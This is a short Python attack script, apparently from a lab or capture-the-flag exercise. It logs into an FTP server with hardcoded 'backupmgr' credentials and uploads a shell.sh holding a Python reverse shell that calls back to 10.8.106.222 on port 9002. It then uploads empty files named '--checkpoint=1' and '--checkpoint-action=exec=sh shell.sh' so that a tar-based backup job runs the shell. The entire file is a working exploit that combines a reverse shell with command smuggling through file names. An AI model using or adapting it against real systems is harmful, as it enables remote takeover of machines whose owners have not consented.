#!/usr/bin/env python3.7
from ftplib import FTP
import io

host = '172.20.0.1'
username = "backupmgr"
password = "SuperS1ckP4ssw0rd123!"

ftp = FTP(host = host)
login_status = ftp.login(user = username,passwd = password)
print(login_status)
ftp.set_pasv(False)
ftp.cwd('files')
print(ftp.dir())

shell = io.BytesIO(b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')
trash = io.BytesIO(b'')

ftp.storlines('STOR shell.sh',shell)
ftp.storlines('STOR --checkpoint=1',trash)
ftp.storlines('STOR --checkpoint-action=exec=sh shell.sh',trash)
ftp.dir()

ftp.quit()
